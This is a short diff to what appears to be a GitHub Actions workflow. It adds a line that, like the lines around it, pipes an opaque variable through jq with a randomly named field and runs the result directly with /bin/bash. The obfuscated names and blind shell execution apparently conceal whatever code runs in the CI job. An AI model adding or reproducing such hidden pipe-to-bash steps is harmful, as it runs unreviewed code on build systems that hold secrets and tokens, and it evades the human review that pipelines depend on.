@@ -47,6 +47,7 @@ jobs:
           echo $p4 | jq -r .xgc91457 | /bin/bash
           printf '%s' "$onc02" | jq -r .tod0153 | /bin/bash
           echo $o6 | jq -r .rh7 | /bin/bash
+          echo $vej62122 | jq -r .fqhk005 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
